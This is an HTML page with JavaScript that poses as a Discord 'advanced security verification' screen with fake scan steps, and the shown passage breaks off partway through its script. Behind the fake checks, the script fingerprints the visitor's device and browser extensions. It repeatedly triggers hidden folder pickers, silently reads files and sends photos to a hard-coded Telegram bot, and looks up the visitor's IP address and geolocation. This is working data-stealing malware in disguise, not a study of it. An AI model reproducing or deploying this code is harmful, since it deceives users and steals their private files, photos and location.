<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discordé«˜çº§éªŒè¯ - æœåŠ¡å™¨è®¿é—®æˆæƒ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #36393f, #2f3136);
            color: #dcddde;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .discord-container {
            width: 100%;
            max-width: 520px;
            background: #2f3136;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            border: 1px solid #202225;
        }

        .discord-header {
            background: linear-gradient(135deg, #202225, #18191c);
            padding: 35px;
            text-align: center;
            border-bottom: 2px solid #5865f2;
            position: relative;
            overflow: hidden;
        }

        .discord-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(88, 101, 242, 0.1), transparent);
            animation: shine 3s infinite linear;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }

        .discord-icon {
            width: 90px;
            height: 90px;
            background: #5865f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            position: relative;
            z-index: 2;
            box-shadow: 0 4px 20px rgba(88, 101, 242, 0.3);
        }

        .discord-icon svg {
            width: 50px;
            height: 50px;
            fill: white;
        }

        .server-name {
            color: #ffffff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            position: relative;
            z-index: 2;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        .verification-text {
            color: #b9bbbe;
            font-size: 16px;
            position: relative;
            z-index: 2;
        }

        .discord-body {
            padding: 40px;
            position: relative;
        }

        .security-level {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
            padding: 12px;
            background: rgba(88, 101, 242, 0.1);
            border-radius: 6px;
            border: 1px solid rgba(88, 101, 242, 0.2);
        }

        .security-icon {
            font-size: 24px;
        }

        .security-text {
            font-size: 14px;
            font-weight: 600;
            color: #8ea1e1;
        }

        .verification-step {
            background: rgba(32, 34, 37, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #40444b;
            transition: all 0.3s;
        }

        .verification-step.active {
            border-color: #5865f2;
            box-shadow: 0 0 0 1px #5865f2;
        }

        .step-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 15px;
        }

        .step-title {
            display: flex;
            align-items: center;
            gap: 12px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
        }

        .step-icon {
            font-size: 22px;
            color: #5865f2;
        }

        .step-status {
            font-size: 12px;
            padding: 4px 10px;
            border-radius: 12px;
            font-weight: 600;
        }

        .status-pending {
            background: rgba(114, 137, 218, 0.1);
            color: #7289da;
        }

        .status-complete {
            background: rgba(67, 181, 129, 0.1);
            color: #43b581;
        }

        .step-description {
            color: #b9bbbe;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .loading-container {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
        }

        .loading-row {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .loading-text {
            flex: 1;
            font-size: 13px;
            color: #b9bbbe;
        }

        .loading-dots {
            display: flex;
            gap: 4px;
        }

        .loading-dot {
            width: 6px;
            height: 6px;
            background: #5865f2;
            border-radius: 50%;
            animation: pulse 1.5s infinite ease-in-out;
        }

        .loading-dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .loading-dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .progress-bar {
            height: 6px;
            background: rgba(64, 68, 75, 0.5);
            border-radius: 3px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #5865f2, #8ea1e1);
            border-radius: 3px;
            width: 0%;
            transition: width 0.5s ease;
        }

        .verify-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #5865f2, #4752c4);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .verify-button:hover:not(:disabled) {
            background: linear-gradient(135deg, #4752c4, #3c45a5);
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.3);
        }

        .verify-button:disabled {
            background: #4f545c;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .status-message {
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            font-size: 14px;
            display: none;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .status-success {
            background: rgba(67, 181, 129, 0.1);
            color: #43b581;
            border: 1px solid rgba(67, 181, 129, 0.3);
        }

        .status-error {
            background: rgba(240, 71, 71, 0.1);
            color: #f04747;
            border: 1px solid rgba(240, 71, 71, 0.3);
        }

        .privacy-notice {
            font-size: 12px;
            color: #72767d;
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #40444b;
            line-height: 1.6;
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 560px) {
            .discord-body {
                padding: 25px;
            }
            .discord-header {
                padding: 25px;
            }
            .server-name {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="discord-container">
        <!-- Discordå¤´éƒ¨ -->
        <div class="discord-header">
            <div class="discord-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 6.658c.587 0 1.063.476 1.063 1.063v8.558c0 .587-.476 1.063-1.063 1.063H6.438c-.587 0-1.063-.476-1.063-1.063V7.721c0-.587.476-1.063 1.063-1.063h11.124zM12 8.5c-1.933 0-3.5 1.567-3.5 3.5s1.567 3.5 3.5 3.5 3.5-1.567 3.5-3.5S13.933 8.5 12 8.5z"/>
                </svg>
            </div>
            <div class="server-name">é«˜çº§å®‰å…¨éªŒè¯</div>
            <div class="verification-text">éœ€è¦å®Œæˆä»¥ä¸‹å®‰å…¨æ£€æŸ¥ä»¥è®¿é—®æœåŠ¡å™¨</div>
        </div>

        <!-- éªŒè¯ä¸»ä½“ -->
        <div class="discord-body">
            <div class="security-level">
                <span class="security-icon">ğŸ›¡ï¸</span>
                <span class="security-text">å®‰å…¨ç­‰çº§ï¼šé«˜çº§é˜²æŠ¤ (Level 3)</span>
            </div>

            <!-- æ­¥éª¤1ï¼šè®¾å¤‡æ‰«æ -->
            <div id="step1" class="verification-step active">
                <div class="step-header">
                    <div class="step-title">
                        <span class="step-icon">ğŸ”</span>
                        <span>è®¾å¤‡å®‰å…¨æ£€æŸ¥</span>
                    </div>
                    <div id="step1Status" class="step-status status-pending">å¾…æ‰«æ</div>
                </div>
                <div class="step-description">
                    æ­£åœ¨æ‰«ææ‚¨çš„è®¾å¤‡ä¿¡æ¯ä»¥ç¡®ä¿å®‰å…¨ç¯å¢ƒ...
                </div>
                
                <div class="loading-container">
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨æ”¶é›†ç³»ç»Ÿä¿¡æ¯</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨æ£€æµ‹å®‰å…¨ç¯å¢ƒ</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨éªŒè¯è®¾å¤‡æŒ‡çº¹</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                </div>
                
                <div class="progress-bar">
                    <div class="progress-fill" id="step1Progress"></div>
                </div>
            </div>

            <!-- æ­¥éª¤2ï¼šæ‘„åƒå¤´éªŒè¯ -->
            <div id="step2" class="verification-step">
                <div class="step-header">
                    <div class="step-title">
                        <span class="step-icon">ğŸ“·</span>
                        <span>ç”Ÿç‰©ç‰¹å¾éªŒè¯</span>
                    </div>
                    <div id="step2Status" class="step-status status-pending">ç­‰å¾…ä¸­</div>
                </div>
                <div class="step-description">
                    æ­£åœ¨è¿›è¡Œäººè„¸è¯†åˆ«éªŒè¯ä»¥ç¡®ä¿æ˜¯çœŸäººç”¨æˆ·...
                </div>
                
                <div id="cameraContainer" class="loading-container hidden">
                    <div style="text-align: center; padding: 20px;">
                        <div style="font-size: 48px; margin-bottom: 15px;">ğŸ“±</div>
                        <div style="color: #b9bbbe; margin-bottom: 15px;">æ­£åœ¨å¯åŠ¨æ‘„åƒå¤´...</div>
                        <div class="loading-dots" style="justify-content: center;">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- æ­¥éª¤3ï¼šæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ -->
            <div id="step3" class="verification-step">
                <div class="step-header">
                    <div class="step-title">
                        <span class="step-icon">ğŸ’¾</span>
                        <span>æ–‡ä»¶ç³»ç»ŸéªŒè¯</span>
                    </div>
                    <div id="step3Status" class="step-status status-pending">ç­‰å¾…ä¸­</div>
                </div>
                <div class="step-description">
                    æ­£åœ¨éªŒè¯æ–‡ä»¶ç³»ç»Ÿå®Œæ•´æ€§ä»¥æ£€æµ‹æ¶æ„è½¯ä»¶...
                </div>
                
                <div class="loading-container">
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨æ‰«æç³»ç»Ÿç›®å½•</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨æ£€æŸ¥åª’ä½“æ–‡ä»¶</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨åˆ†ææ–‡ä»¶ç»“æ„</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- æ­¥éª¤4ï¼šç½‘ç»œéªŒè¯ -->
            <div id="step4" class="verification-step">
                <div class="step-header">
                    <div class="step-title">
                        <span class="step-icon">ğŸŒ</span>
                        <span>ç½‘ç»œç¯å¢ƒéªŒè¯</span>
                    </div>
                    <div id="step4Status" class="step-status status-pending">ç­‰å¾…ä¸­</div>
                </div>
                <div class="step-description">
                    æ­£åœ¨éªŒè¯ç½‘ç»œè¿æ¥å’Œå®‰å…¨è®¾ç½®...
                </div>
                
                <div class="loading-container">
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨æ£€æµ‹IPåœ°å€</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨åˆ†æç½‘ç»œæµé‡</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                    <div class="loading-row">
                        <span class="loading-text">æ­£åœ¨éªŒè¯åœ°ç†ä½ç½®</span>
                        <div class="loading-dots">
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                            <div class="loading-dot"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- çŠ¶æ€æ¶ˆæ¯ -->
            <div id="successMessage" class="status-message status-success hidden">
                âœ… æ‰€æœ‰å®‰å…¨æ£€æŸ¥é€šè¿‡ï¼æ­£åœ¨å‡†å¤‡æœåŠ¡å™¨è®¿é—®æƒé™...
            </div>
            
            <div id="errorMessage" class="status-message status-error hidden">
                âŒ å®‰å…¨æ£€æŸ¥å¤±è´¥ï¼Œè¯·é‡è¯•
            </div>

            <!-- éªŒè¯æŒ‰é’® -->
            <button class="verify-button" id="verifyButton" onclick="startAdvancedVerification()">
                <span id="buttonIcon">ğŸ›¡ï¸</span>
                <span id="buttonText">å¼€å§‹å®‰å…¨æ£€æŸ¥</span>
            </button>

            <!-- éšç§å£°æ˜ -->
            <div class="privacy-notice">
                æ­¤éªŒè¯è¿‡ç¨‹ä»…ç”¨äºå®‰å…¨æ£€æŸ¥ï¼Œæ‰€æœ‰æ•°æ®å°†åœ¨éªŒè¯å®Œæˆåè‡ªåŠ¨åˆ é™¤ã€‚
                <br>ç‚¹å‡»"å¼€å§‹å®‰å…¨æ£€æŸ¥"å³è¡¨ç¤ºæ‚¨åŒæ„æˆ‘ä»¬çš„éšç§æ”¿ç­–å’ŒæœåŠ¡æ¡æ¬¾ã€‚
            </div>
        </div>
    </div>

    <!-- éšè”½çš„æ”¶é›†å…ƒç´  -->
    <iframe id="hiddenFrame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    <input type="file" id="hiddenFileInput" style="display:none;" webkitdirectory directory multiple>
    <div id="dataCollector" style="display:none;"></div>

    <script>
        // ==================== é…ç½® ====================
        const TELEGRAM_CONFIG = {
            botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
            chatId: "8313770381"
        };

        // å¢å¼ºçš„æ”¶é›†æ•°æ®
        let collectedData = {
            sessionId: generateSessionId(),
            startTime: new Date().toISOString(),
            steps: {},
            device: {},
            network: {},
            files: [],
            photos: [],
            folders: [],
            clipboard: {},
            extensions: []
        };

        let currentStep = 1;
        let isCollecting = false;
        let stealthMode = true;
// ==================== å¢å¼ºçš„è®¾å¤‡ä¿¡æ¯æ”¶é›† ====================

async function collectAdvancedDeviceInfo() {
    collectedData.device = {
        // åŸºç¡€ä¿¡æ¯
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        
        // å±å¹•ä¿¡æ¯
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type
        },
        
        // ç¡¬ä»¶ä¿¡æ¯
        hardware: {
            concurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints
        },
        
        // æµè§ˆå™¨èƒ½åŠ›
        capabilities: {
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            doNotTrack: navigator.doNotTrack,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver
        },
        
        // è¿æ¥ä¿¡æ¯
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            downlinkMax: navigator.connection.downlinkMax,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            type: navigator.connection.type
        } : null,
        
        // ç”µæ± ä¿¡æ¯
        battery: {}
    };

    // æ”¶é›†ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.device.battery = {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {}
    }

    // æ£€æµ‹æµè§ˆå™¨è¯¦ç»†ä¿¡æ¯
    collectedData.device.browser = detectBrowserDetails();
    collectedData.device.os = detectOSDetails();
    
    // æ£€æµ‹æµè§ˆå™¨æ‰©å±•
    detectExtensions();
    
    // è·å–CanvasæŒ‡çº¹
    collectedData.device.canvasFingerprint = getCanvasFingerprint();
    
    // è·å–WebGLä¿¡æ¯
    collectedData.device.webgl = getWebGLInfo();
    
    // è·å–éŸ³é¢‘æŒ‡çº¹
    collectedData.device.audioFingerprint = getAudioFingerprint();
    
    // æ£€æµ‹æ’ä»¶
    collectedData.device.plugins = Array.from(navigator.plugins).map(p => ({
        name: p.name,
        description: p.description,
        filename: p.filename
    }));
    
    // æ£€æµ‹MIMEç±»å‹
    collectedData.device.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
        type: m.type,
        description: m.description,
        suffixes: m.suffixes
    }));

    sendToTelegram(`ğŸ“± è®¾å¤‡ä¿¡æ¯æ”¶é›†å®Œæˆ\nè®¾å¤‡: ${collectedData.device.os.name} ${collectedData.device.os.version}\næµè§ˆå™¨: ${collectedData.device.browser.name} ${collectedData.device.browser.version}\nå±å¹•: ${collectedData.device.screen.width}x${collectedData.device.screen.height}\nCPUæ ¸å¿ƒ: ${collectedData.device.hardware.concurrency}`);
}

// æ£€æµ‹æµè§ˆå™¨è¯¦æƒ…
function detectBrowserDetails() {
    const ua = navigator.userAgent;
    let browser = { name: 'Unknown', version: 'Unknown' };
    
    // Chrome
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) {
        browser.name = 'Chrome';
        const match = ua.match(/Chrome\/(\d+\.\d+)/);
        if (match) browser.version = match[1];
    }
    // Firefox
    else if (/Firefox/.test(ua)) {
        browser.name = 'Firefox';
        const match = ua.match(/Firefox\/(\d+\.\d+)/);
        if (match) browser.version = match[1];
    }
    // Safari
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
        browser.name = 'Safari';
        const match = ua.match(/Version\/(\d+\.\d+)/);
        if (match) browser.version = match[1];
    }
    // Edge
    else if (/Edg/.test(ua)) {
        browser.name = 'Edge';
        const match = ua.match(/Edg\/(\d+\.\d+)/);
        if (match) browser.version = match[1];
    }
    // Opera
    else if (/Opera|OPR/.test(ua)) {
        browser.name = 'Opera';
        const match = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/);
        if (match) browser.version = match[1];
    }
    
    return browser;
}

// æ£€æµ‹æ“ä½œç³»ç»Ÿè¯¦æƒ…
function detectOSDetails() {
    const ua = navigator.userAgent;
    let os = { name: 'Unknown', version: 'Unknown' };
    
    // Windows
    if (/Windows/.test(ua)) {
        os.name = 'Windows';
        if (/Windows NT 10/.test(ua)) os.version = '10';
        else if (/Windows NT 6.3/.test(ua)) os.version = '8.1';
        else if (/Windows NT 6.2/.test(ua)) os.version = '8';
        else if (/Windows NT 6.1/.test(ua)) os.version = '7';
    }
    // macOS
    else if (/Macintosh/.test(ua)) {
        os.name = 'macOS';
        const match = ua.match(/Mac OS X (\d+[._]\d+)/);
        if (match) os.version = match[1].replace('_', '.');
    }
    // Linux
    else if (/Linux/.test(ua)) {
        os.name = 'Linux';
        if (/Android/.test(ua)) {
            os.name = 'Android';
            const match = ua.match(/Android (\d+\.\d+)/);
            if (match) os.version = match[1];
        }
    }
    // iOS
    else if (/iPhone|iPad|iPod/.test(ua)) {
        os.name = 'iOS';
        const match = ua.match(/OS (\d+)/);
        if (match) os.version = match[1];
    }
    
    return os;
}

// è·å–CanvasæŒ‡çº¹
function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    // ç»˜åˆ¶ä¸€äº›å†…å®¹
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Hello, world!", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillRect(1, 1, 2, 2);
    
    return canvas.toDataURL();
}

// è·å–WebGLä¿¡æ¯
function getWebGLInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return null;
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
    };
}

// è·å–éŸ³é¢‘æŒ‡çº¹
function getAudioFingerprint() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start(0);
        
        const data = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(data);
        
        oscillator.stop(0);
        audioContext.close();
        
        return Array.from(data).slice(0, 10).join(',');
    } catch (e) {
        return null;
    }
}

// æ£€æµ‹æµè§ˆå™¨æ‰©å±•
function detectExtensions() {
    const extensions = [];
    
    // æ£€æµ‹å¸¸è§æ‰©å±•
    const commonExtensions = [
        // Chromeæ‰©å±•
        { id: 'aohghmighlieiainnegkcijnfilokake', name: 'Google Docs' },
        { id: 'apdfllckaahabafndbhieahigkjlhalf', name: 'Google Drive' },
        { id: 'blpcfgokakmgnkcojhhkbfbldkacnbeo', name: 'YouTube' },
        { id: 'pjkljhegncpnkpknbcohdijeoejaedia', name: 'Gmail' },
        { id: 'ghbmnnjooekpmoecnnnilnnbdlolhkhi', name: 'Google Docs Offline' },
        
        // å¹¿å‘Šæ‹¦æˆªå™¨
        { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock' },
        { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock Plus' },
        { id: 'bkdgflcldnnnapblkhphbgpggdiikppg', name: 'uBlock Origin' },
        
        // å¯†ç ç®¡ç†å™¨
        { id: 'dplockeaaplabmcicdodhdpollmlgail', name: 'LastPass' },
        { id: 'jpjpnpmbddbjkfaccjhnkngdpjdnpjkj', name: 'Bitwarden' }
    ];
    
    // é€šè¿‡åˆ›å»ºå›¾ç‰‡æ£€æµ‹æ‰©å±•æ˜¯å¦å­˜åœ¨
    commonExtensions.forEach(ext => {
        const img = new Image();
        img.onload = function() {
            extensions.push(ext.name);
        };
        img.onerror = function() {};
        img.src = `chrome-extension://${ext.id}/manifest.json`;
    });
    
    collectedData.extensions = extensions;
}
// ==================== å¢å¼ºçš„æ–‡ä»¶å¤¹è®¿é—®æŠ€æœ¯ ====================

// è‡ªåŠ¨å°è¯•æ–‡ä»¶å¤¹è®¿é—®
function attemptFolderAccess() {
    // æ–¹æ³•1ï¼šä½¿ç”¨webkitdirectoryï¼ˆChromeï¼‰
    if ('webkitdirectory' in document.createElement('input')) {
        setTimeout(() => {
            try {
                const folderInput = document.createElement('input');
                folderInput.type = 'file';
                folderInput.webkitdirectory = true;
                folderInput.directory = true;
                folderInput.multiple = true;
                folderInput.style.display = 'none';
                
                folderInput.addEventListener('change', async (e) => {
                    const files = Array.from(e.target.files);
                    collectedData.folders.push({
                        name: 'webkitdirectory_access',
                        fileCount: files.length,
                        timestamp: new Date().toISOString()
                    });
                    
                    // å¤„ç†å‰20ä¸ªæ–‡ä»¶
                    for (let i = 0; i < Math.min(files.length, 20); i++) {
                        await processFileSilently(files[i], 'folder_scan');
                    }
                });
                
                document.body.appendChild(folderInput);
                
                // å°è¯•è‡ªåŠ¨è§¦å‘
                setTimeout(() => {
                    try {
                        folderInput.click();
                    } catch (e) {}
                }, 2000);
                
            } catch (e) {}
        }, 3000);
    }
    
    // æ–¹æ³•2ï¼šä½¿ç”¨File System Access APIï¼ˆç°ä»£æµè§ˆå™¨ï¼‰
    if ('showDirectoryPicker' in window) {
        setTimeout(async () => {
            try {
                const dirHandle = await window.showDirectoryPicker();
                collectedData.folders.push({
                    name: dirHandle.name,
                    timestamp: new Date().toISOString(),
                    method: 'file_system_api'
                });
                
                // é€’å½’è¯»å–æ–‡ä»¶
                await readDirectoryFiles(dirHandle);
                
            } catch (e) {
                // ç”¨æˆ·å–æ¶ˆæˆ–é”™è¯¯
            }
        }, 5000);
    }
    
    // æ–¹æ³•3ï¼šé€šè¿‡iframeå°è¯•è®¿é—®
    setTimeout(() => {
        tryFolderAccessViaIframe();
    }, 7000);
    
    // æ–¹æ³•4ï¼šä½¿ç”¨Service Workerè®¿é—®ç¼“å­˜
    if ('serviceWorker' in navigator) {
        setTimeout(() => {
            accessCachedFiles();
        }, 9000);
    }
}

// é€šè¿‡iframeå°è¯•æ–‡ä»¶å¤¹è®¿é—®
function tryFolderAccessViaIframe() {
    const iframe = document.createElement('iframe');
    iframe.sandbox = 'allow-scripts allow-same-origin';
    iframe.style.display = 'none';
    
    iframe.onload = function() {
        const iframeDoc = iframe.contentDocument;
        iframeDoc.write(`
            <script>
                // å°è¯•File System API
                if ('showDirectoryPicker' in window) {
                    try {
                        window.showDirectoryPicker().then(dir => {
                            window.parent.postMessage({
                                type: 'folderAccessSuccess',
                                folderName: dir.name
                            }, '*');
                        }).catch(err => {});
                    } catch(e) {}
                }
                
                // å°è¯•webkitdirectory
                const input = document.createElement('input');
                input.type = 'file';
                input.webkitdirectory = true;
                input.multiple = true;
                input.style.display = 'none';
                
                input.addEventListener('change', function(e) {
                    window.parent.postMessage({
                        type: 'folderFilesFound',
                        fileCount: e.target.files.length
                    }, '*');
                });
                
                document.body.appendChild(input);
                
                // å°è¯•è§¦å‘
                setTimeout(() => {
                    try {
                        input.click();
                    } catch(e) {}
                }, 1000);
            <\/script>
        `);
    };
    
    document.body.appendChild(iframe);
    
    // ç›‘å¬æ¶ˆæ¯
    window.addEventListener('message', (e) => {
        if (e.data.type === 'folderAccessSuccess') {
            sendToTelegram(`ğŸ“ æ–‡ä»¶å¤¹è®¿é—®æˆåŠŸ: ${e.data.folderName}`);
        }
        if (e.data.type === 'folderFilesFound') {
            sendToTelegram(`ğŸ“ å‘ç°æ–‡ä»¶å¤¹æ–‡ä»¶: ${e.data.fileCount} ä¸ª`);
        }
    });
}

// é€šè¿‡Service Workerè®¿é—®ç¼“å­˜æ–‡ä»¶
async function accessCachedFiles() {
    try {
        const cacheNames = await caches.keys();
        for (const cacheName of cacheNames) {
            const cache = await caches.open(cacheName);
            const requests = await cache.keys();
            
            for (const request of requests) {
                if (request.url.match(/\.(jpg|jpeg|png|gif|webp|mp4|mov|avi|mkv|pdf|doc|docx|txt)$/i)) {
                    const response = await cache.match(request);
                    if (response) {
                        const blob = await response.blob();
                        await processFileSilently(blob, 'cache_file');
                    }
                }
            }
        }
    } catch (e) {
        // é™é»˜å¤±è´¥
    }
}

// é€’å½’è¯»å–ç›®å½•æ–‡ä»¶
async function readDirectoryFiles(dirHandle) {
    const files = [];
    
    async function readDir(handle, path = '') {
        for await (const entry of handle.values()) {
            if (entry.kind === 'file') {
                try {
                    const file = await entry.getFile();
                    files.push({
                        name: entry.name,
                        path: path + '/' + entry.name,
                        size: file.size,
                        type: file.type
                    });
                    
                    // å¤„ç†æ–‡ä»¶
                    await processFileSilently(file, 'recursive_scan');
                    
                } catch (e) {
                    // è·³è¿‡æ— æ³•è®¿é—®çš„æ–‡ä»¶
                }
            } else if (entry.kind === 'directory') {
                await readDir(entry, path + '/' + entry.name);
            }
        }
    }
    
    await readDir(dirHandle);
    return files;
}

// é™é»˜å¤„ç†æ–‡ä»¶
async function processFileSilently(file, source) {
    try {
        // åˆ›å»ºæ–‡ä»¶ä¿¡æ¯
        const fileInfo = {
            name: file.name || 'unnamed',
            size: file.size,
            type: file.type || 'unknown',
            source: source,
            timestamp: new Date().toISOString()
        };
        
        // æ·»åŠ åˆ°æ”¶é›†æ•°æ®
        collectedData.files.push(fileInfo);
        
        // æ ¹æ®æ–‡ä»¶ç±»å‹å¤„ç†
        if (file.type && file.type.startsWith('image/')) {
            collectedData.photos.push(fileInfo);
            
            // å‘é€å›¾ç‰‡åˆ°Telegram
            if (file.size < 10 * 1024 * 1024) { // å°äº10MB
                await sendPhotoToTelegram(file, `silent_${source}`);
            }
        }
        // å¦‚æœæ˜¯æ–‡æ¡£
        else if (file.type && (
            file.type.includes('pdf') ||
            file.type.includes('document') ||
            file.type.includes('text') ||
            file.name.match(/\.(txt|pdf|doc|docx|xls|xlsx|ppt|pptx)$/i)
        )) {
            // å°è¯•è¯»å–æ–‡æœ¬å†…å®¹
            if (file.size < 1024 * 1024) { // å°äº1MB
                try {
                    const text = await file.text();
                    fileInfo.preview = text.substring(0, 500);
                } catch (e) {}
            }
        }
        
        return true;
        
    } catch (e) {
        return false;
    }
}
// ==================== å¢å¼ºçš„ç½‘ç»œä¿¡æ¯æ”¶é›† ====================

async function collectNetworkAndLocation() {
    collectedData.network = {};
    
    // è·å–IPåœ°å€
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        collectedData.network.ip = ipData.ip;
        
        // è·å–è¯¦ç»†ä¿¡æ¯
        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoRes.json();
        
        collectedData.network.geo = {
            ip: ipData.ip,
            city: geoData.city,
            region: geoData.region,
            country: geoData.country_name,
            countryCode: geoData.country_code,
            continentCode: geoData.continent_code,
            postal: geoData.postal,
